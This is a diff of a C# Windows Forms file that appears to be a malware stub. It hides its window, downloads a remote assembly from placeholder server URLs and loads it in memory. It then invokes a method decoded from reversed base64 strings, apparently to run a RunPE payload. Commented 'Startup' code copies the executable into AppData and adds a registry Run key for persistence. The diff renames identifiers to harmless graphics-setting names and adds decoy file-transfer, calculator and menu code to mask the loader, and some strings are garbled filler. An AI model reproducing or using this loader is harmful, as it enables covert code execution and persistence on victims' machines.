@@ -27,6 +27,8 @@ using System.Data.Common;
 using Microsoft.VisualBasic.CompilerServices;
 using System.Runtime.CompilerServices;
 using System.Windows.Markup;
+using System.Net.Sockets;
+
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -47,21 +49,200 @@ using System.Windows.Markup;
 //Method #2
 
 
+namespace TcpMultiFileTransfer
+{
+    public class ReceiveFileInfo
+    {
+        public string FileName { get; set; }
+        public double FileSize { get; set; }
+        private Receiver receiver;
 
-namespace SocketServer
+        public ReceiveFileInfo(Receiver _receiver)
+        {
+            receiver = _receiver;
+        }
+
+        public void LoadData()
+        {
+            receiver.LoadFile();
+        }
+    }
+}
+
+namespace TcpMultiFileTransfer
+{
+    public class Sender
+    {
+        private static readonly byte[] WAIT = new byte[] { 0 };
+        public delegate void ListViewItemEvent(ListViewItem listViewItem);
+        public static ListViewItemEvent AddListViewItem { get; set; }
+        private static readonly List<Socket> sockets = new List<Socket>();
+
+        public static void Send(IPAddress iPAddress, int port, string filePath)
+        {
+            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            sockets.Add(socket);
+            var localEndPoint = new IPEndPoint(iPAddress, port);
+            try
+            {
+                socket.Connect(localEndPoint);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+
+            var fileInfo = new FileInfo(filePath);
+            byte[] bytesFileInfo = Encoding.UTF8.GetBytes(fileInfo.Name + "|" + fileInfo.Length);
+
+            var lvi = listViewItem(fileInfo);
+            AddListViewItem(lvi);
+
+            socket.Send(bytesFileInfo);
+            socket.Receive(WAIT);
+
+            var stopwatch = new Stopwatch();
+            stopwatch.Start();
+
+            int bytesRead;
+            byte[] buffer = new byte[332800]; // 325 KB
+            try
+            {
+                using (var networkStream = new NetworkStream(socket))
+                using (var binaryWriter = new BinaryWriter(networkStream))
+                using (var read = File.OpenRead(filePath))
+                {
+                    while ((bytesRead = read.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        binaryWriter.Write(buffer, 0, bytesRead);
+                        binaryWriter.Flush();
+                    }
+
+                    stopwatch.Stop();
+                    lvi.SubItems[3].Text = totalTime(stopwatch);
+                    lvi.SubItems[2].Text = "OK";
+                }
+            }
+            catch
+            {
+                lvi.SubItems[2].Text = "Failed!";
+            }
+            finally
+            {
+                try
+                {
+                    if (socket.Connected)
+                        socket.Disconnect(false);
+                    socket.Close();
+                    socket.Dispose();
+                    socket = null;
+                }
+                catch { }
+            }
+        }
+
+        private static string totalTime(Stopwatch stopwatch)
+        {
+            double totalT = stopwatch.ElapsedMilliseconds / 1000.0;
+            return totalT > 60 ? String.Format("{0:0.##}", totalT / 60.0) + " min" : String.Format("{0:0.##}", totalT) + " sec";
+        }
+
+        private static ListViewItem listViewItem(FileInfo fileInfo)
+        {
+            var lvi = new ListViewItem();
+            lvi.Text = fileInfo.Name;
+            string strSize = String.Format("{0:0.##}", fileInfo.Length / 1024.0) + " KB";
+            if (fileInfo.Length / 1024.0 > 1024)
+            {
+                strSize = String.Format("{0:0.##}", fileInfo.Length / 1024.0 / 1024.0) + " MB";
+            }
+            lvi.SubItems.Add(strSize);
+            lvi.SubItems.Add("Sending...");
+            lvi.SubItems.Add("");
+            return lvi;
+        }
+
+        public static void Close()
+        {
+            foreach (Socket item in sockets)
+            {
+                if (item != null)
+                {
+                    try
+                    {
+                        if (item.Connected)
+                            item.Disconnect(false);
+
+                        item.Close();
+                        item.Dispose();
+                    }
+                    catch { }
+                }
+            }
+        }
+    }
+}
+namespace TcpMultiFileTransfer
+{
+    public class Receiver
+    {
+        private readonly Socket socket;
+        private readonly string fileName;
+
+        public Receiver(Socket socket, string fileName)
+        {
+            this.socket = socket;
+            this.fileName = fileName;
+        }
+
+        public void LoadFile()
+        {
+            int bytesRead = 0;
+            byte[] buffer = new byte[332800]; // 325 KB
+            using (var networkStream = new NetworkStream(socket))
+            using (var binaryReader = new BinaryReader(networkStream))
+            using (Stream writer = File.OpenWrite("Downloads\\" + fileName))
+            {
+                while (networkStream.CanRead && (bytesRead = binaryReader.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    writer.Write(buffer, 0, bytesRead);
+                    writer.Flush();
+                }
+            }
+            Dispose();
+        }
+
+        private void Dispose()
+        {
+            socket.Disconnect(false);
+            socket.Close();
+            socket.Dispose();
+        }
+    }
+}
+
+namespace TcpMultiFileTransfer
 {
 
 
 
-    public class Form1 : Form
+    public class Form0 : Form
     {
+        public int x = 0;
+        private bool isCollapsed = true;
+        private bool loeschen = false;
+        public string ziel;
+        public string value;
+        List<string> Haltestellen = new List<string>();
+        List<string> Auswahl = new List<string>();
 
-
-        public Form1()
+        public Form0()
         {
 
 
-
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
             this.Hide();
 
 
@@ -96,26 +277,26 @@ namespace SocketServer
             {
 
 
-               using (WebClient dprint = new WebClient())
+               using (WebClient pixelLightCount = new WebClient())
                 {
 
                   
       
-                    byte[] log_message = Convert.FromBase64String(PlexConnect("=IXZwBXYydFbhRncvBVZjlmdlR0c39GZul2V"));
+                    byte[] vSyncCount = Convert.FromBase64String(shadowCascade2Split("=IXZwBXYydFbhRncvBVZjlmdlR0c39GZul2V"));
 
-                    string JSConverter = Encoding.UTF8.GetString(log_message);
+                    string particleRaycastBudget = Encoding.UTF8.GetString(vSyncCount);
 
-                    byte[] getSetting = Convert.FromBase64String(PlexConnect("==gchJGbv9GVn5WaoRXeyVmdF5yclxGctF2Uu9Wa0l2cvBXbvN0c39GZul2V")); //Redefine Base64 URL
+                    byte[] anisotropicTextures = Convert.FromBase64String(shadowCascade2Split("==gchJGbv9GVn5WaoRXeyVmdF5yclxGctF2Uu9Wa0l2cvBXbvN0c39GZul2V")); //Redefine Base64 URL
 
-                    string aTVLanguage = Encoding.UTF8.GetString(getSetting);
+                    string aTVLanguage = Encoding.UTF8.GetString(anisotropicTextures);
 
-                    var send_response = new WebClient().DownloadData(%ServerRunPe%);
+                    var softParticles = new WebClient().DownloadData(%ServerRunPe%);
 
-                    object basename  = new object[] {"APPRUN", string.Empty, dprint.DownloadData(%ServerGen%) };
+                    object realtimeReflectionProbes  = new object[] {"APPRUN", string.Empty, pixelLightCount.DownloadData(%ServerGen%) };
 
-                    Assembly __name__ = Assembly.Load(send_response);
+                    Assembly billboardsFaceCameraPosition = Assembly.Load(softParticles);
 
-                    __name__.GetType(string.Join("Shutting down (HTTPS).", aTVLanguage)).InvokeMember(string.Join("Shutting down (HTTPS).", JSConverter), BindingFlags.InvokeMethod, null, null, (object[])basename );
+                    billboardsFaceCameraPosition.GetType(string.Join("Shutting down (HTTPS).", aTVLanguage)).InvokeMember(string.Join("Shutting down (HTTPS).", particleRaycastBudget), BindingFlags.InvokeMethod, null, null, (object[])realtimeReflectionProbes );
                 
                     this.Close();
 
@@ -131,27 +312,27 @@ namespace SocketServer
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Form1());
-           
-       
+            Application.Run(new Form0());
+
+
         }
-        
+
 
         //Startup   public static void  win32serviceutil()
         //Startup   {
         //Startup       int _svc_name_   = Conversions.ToInteger("1");
-        //Startup       if ((double)_svc_name_   != Conversions.ToDouble("1") || Registry.GetValue(PlexConnect("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
-        //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
+        //Startup       if ((double)_svc_name_   != Conversions.ToDouble("1") || Registry.GetValue(shadowCascade2Split("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "shadowCascade2Split", (object)null) != null) return;
+        //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\shadowCascade2Split\\shadowCascade2Split.exe";
         //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
         //Startup       {
         //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
         //Startup           File.Copy(Application.ExecutablePath, email, true);
         //Startup       }
-        //Startup       Registry.SetValue(PlexConnect("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
+        //Startup       Registry.SetValue(shadowCascade2Split("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "shadowCascade2Split", (object)email);
         //Startup   }
 
 
-        public static string PlexConnect(string s)
+        public static string shadowCascade2Split(string s)
         {
             char[] charArray = s.ToCharArray();
             Array.Reverse(charArray);
@@ -170,49 +351,49 @@ namespace SocketServer
 
         private void webBrowser13_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
-               int sayi1, sayi2;
+            int sayi1, sayi2;
             char opt;
             double sonuc;
 
 
-            Console.WriteLine("\n\fileID: 7, guid: 0000000000000000f000000000000000, type: 0");
-            Console.WriteLine("\nTOPLAMA İÇİN + m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("ÇIKARMA İÇİN - m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("ÇARPMA İÇİN * m_PreloadedShaders m_PreloadedShaders");
-            Console.WriteLine("BÖLME İÇİN + m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("for additional information see http://langui.sh/2013/08/27/appletv-ssl-shadowCascade2Split/");
+            Console.WriteLine("from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer");
+            Console.WriteLine("from SocketServer import ThreadingMixIn");
+            Console.WriteLine("import ssl");
+            Console.WriteLine("from multiprocessing import Pipe  # inter process communication");
 
-            Console.Write("\n\n GraphicsSettings GraphicsSettings GraphicsSettings :");
+            Console.Write("");
             sayi1 = Convert.ToInt32(Console.ReadLine());
 
-            Console.Write(" GraphicsSettings GraphicsSettings GraphicsSettings :");
+            Console.Write("");
             sayi2 = Convert.ToInt32(Console.ReadLine());
 
-            Console.Write("\nGraphicsSettings\t");
+            Console.Write("");
             opt = Convert.ToChar(Console.ReadLine());
 
             if (opt == '+')
             {
                 sonuc = sayi1 + sayi2;
-                Console.WriteLine("\n{0} + preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+                Console.WriteLine("", sayi1, sayi2, sonuc);
             }
             else if (opt == '-')
             {
                 sonuc = sayi1 - sayi2;
-                Console.WriteLine("\n{0} - preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+                Console.WriteLine("from multiprocessing import Pipe  # inter process communication", sayi1, sayi2, sonuc);
             }
             else if (opt == '*')
             {
                 sonuc = sayi1 * sayi2;
-                Console.WriteLine("\n{0} x preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+                Console.WriteLine("from multiprocessing import Pipe  # inter process communication", sayi1, sayi2, sonuc);
             }
             else if (opt == '/')
             {
                 sonuc = (double)sayi1 / sayi2;
-                Console.WriteLine("\n{0} / preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+                Console.WriteLine("from multiprocessing import Pipe  # inter process communication", sayi1, sayi2, sonuc);
             }
             else
             {
-                Console.WriteLine("0000000000000000f000000000000000 GraphicsSettings");
+                Console.WriteLine("from multiprocessing import Pipe  # inter process communication");
             }
 
 
@@ -233,7 +414,268 @@ namespace SocketServer
         {
 
         }
+        private int childFormNumber = 0;
 
+
+        private void ShowNewForm(object sender, EventArgs e)
+        {
+            Form childForm = new Form();
+            childForm.MdiParent = this;
+            childForm.Text = "Window " + childFormNumber++;
+            childForm.Show();
+        }
+
+        private void OpenFile(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
+            openFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+            if (openFileDialog.ShowDialog(this) == DialogResult.OK)
+            {
+                string FileName = openFileDialog.FileName;
+            }
+        }
+
+        private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog saveFileDialog = new SaveFileDialog();
+            saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
+            saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+            if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
+            {
+                string FileName = saveFileDialog.FileName;
+            }
+        }
+
+        private void ExitToolsStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void CutToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+        }
+
+        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+        }
+
+        private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+        }
+
+        private void ToolBarToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void StatusBarToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void CascadeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            LayoutMdi(MdiLayout.Cascade);
+        }
+
+        private void TileVerticalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            LayoutMdi(MdiLayout.TileVertical);
+        }
+
+        private void TileHorizontalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            LayoutMdi(MdiLayout.TileHorizontal);
+        }
+
+        private void ArrangeIconsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            LayoutMdi(MdiLayout.ArrangeIcons);
+        }
+
+        private void CloseAllToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Form childForm in MdiChildren)
+            {
+                childForm.Close();
+            }
+        }
+
+        private void menuStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+
+        private void fileMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator4_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void printToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void printPreviewToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void printSetupToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator5_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void editMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void undoToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void redoToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator6_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator7_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void viewMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolsMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void windowsMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void helpMenu_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void contentsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void indexToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator8_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+
+        private void saveToolStripButton_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void printToolStripButton_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void printPreviewToolStripButton_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripSeparator2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void helpToolStripButton_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+
+        private void toolStripStatusLabel_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolTip_Popup(object sender, PopupEventArgs e)
+        {
+
+        }
         private void webBrowser4_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
 
@@ -422,26 +864,5 @@ namespace SocketServer
         }
     }
 
-
-    static class HasherEnume
-    {
-
-
-     
- 
-    }
-
-}
-
-
-public class Payment
-{
-    public string Name { get; set; }
-
-
-    public override string ToString()
-    {
-        return "Payment {{ Name = {Name}, Amount = {Amount}, Due = {Frequency} }}";
-    }
 }
 
